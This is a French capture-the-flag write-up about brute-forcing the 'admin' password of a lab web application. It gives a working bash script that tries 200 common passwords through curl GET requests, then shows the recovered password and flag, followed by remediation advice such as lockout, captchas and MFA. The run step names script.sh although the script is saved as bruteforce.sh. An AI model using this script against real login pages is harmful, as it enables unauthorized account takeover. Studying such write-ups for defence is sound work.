
---

# Attaque par force brute pour découvrir un mot de passe

## Description de la faille

Une attaque par force brute a été utilisée pour découvrir le mot de passe de l'utilisateur `admin` en essayant les mots de passe les plus couramment utilisés. Une liste des 200 mots de passe les plus courants a été utilisée pour tenter de se connecter automatiquement jusqu'à ce que le mot de passe correct soit trouvé.

## Étapes pour découvrir la faille

1. **Obtenir la liste des mots de passe les plus courants** :
   - Téléchargez la liste des 200 mots de passe les plus utilisés à partir de [ce lien](https://s1.nordcdn.com/nord/misc/0.78.0/nordpass/top-200-2023/200-most-common-passwords-fr.pdf).
   - Sauvegardez ces mots de passe dans un fichier texte nommé `pswdlist.txt`.

   ```sh
   touch pswdlist.txt
   # Ajoutez manuellement les 200 mots de passe dans ce fichier
   ```

2. **Créer un script bash pour automatiser la tentative de connexion** :
   - Créez un script bash nommé `bruteforce.sh` avec le contenu suivant :

   ```bash
   #!/bin/bash

   pswds=($(cat pswdlist.txt))
   length=${#pswds[@]}
   current=0
   ip_address="192.168.1.10" # Remplace par ip-addr

   for pswd in "${pswds[@]}"
   do
       response=$(curl -s "http://$ip_address/?page=signin&username=admin&password=$pswd&Login=Login" | grep "flag")

       if [ ! -z "$response" ]; then
           echo "Password is : $pswd"
           echo $response
           break
       fi

       current=$((current+1))
       echo -ne "Current progress : $(((current * 100) / length))%\r"
   done
   ```

3. **Exécuter le script** :
   - Rendez le script exécutable et exécutez-le :

   ```sh
   chmod +x script.sh
   ./script.sh
   ```

4. **Trouver le mot de passe** :
   - Le script tente de se connecter en utilisant chaque mot de passe de la liste jusqu'à trouver le mot de passe correct. Lorsque le mot de passe est trouvé, le script affiche le mot de passe et le flag associé.
   - Dans cet exemple, le mot de passe trouvé est `shadow`.

   ```
   Password is : shadow
   flag: b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
   ```

## Flag

```
b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
```

## Comment remédier à cette faille

Pour remédier à cette faille de sécurité, il est crucial de mettre en place plusieurs mesures de protection contre les attaques par force brute :

1. **Limiter les tentatives de connexion** :
   - Implémentez une politique de verrouillage de compte après un certain nombre de tentatives de connexion échouées. Par exemple, après 5 tentatives échouées, verrouillez le compte pendant un certain temps ou jusqu'à ce qu'une action de l'utilisateur soit nécessaire (comme réinitialiser le mot de passe).

2. **Utiliser des captchas** :
   - Ajoutez des captchas à la page de connexion pour empêcher les scripts automatisés de tenter des connexions. Cela ajoutera une couche de sécurité supplémentaire en vérifiant que l'utilisateur est humain.

3. **Surveiller les tentatives de connexion** :
   - Mettez en place une surveillance et des alertes pour détecter les tentatives de connexion suspectes. Si de nombreuses tentatives de connexion échouées sont détectées, il peut s'agir d'une attaque par force brute en cours.

4. **Utiliser des mots de passe forts et uniques** :
   - Encouragez les utilisateurs à utiliser des mots de passe forts et uniques. Implémentez des règles de complexité des mots de passe (longueur minimale, utilisation de caractères spéciaux, etc.).

5. **Authentification multifactorielle (MFA)** :
   - Ajoutez une authentification multifactorielle (MFA) pour augmenter la sécurité des comptes. Même si un attaquant obtient le mot de passe, il aura besoin d'un deuxième facteur (comme un code envoyé sur le téléphone de l'utilisateur) pour se connecter.

6. **Hashing sécurisé des mots de passe** :
   - Assurez-vous que les mots de passe sont stockés de manière sécurisée en utilisant des algorithmes de hachage robustes (comme bcrypt, scrypt ou Argon2) avec un salt unique pour chaque utilisateur.

## Conclusion

Cette faille montre l'importance de sécuriser les pages de connexion contre les attaques par force brute. En mettant en œuvre les mesures de sécurité mentionnées ci-dessus, la sécurité des comptes utilisateurs peut être significativement améliorée, rendant les attaques par force brute beaucoup plus difficiles et moins efficaces.

---

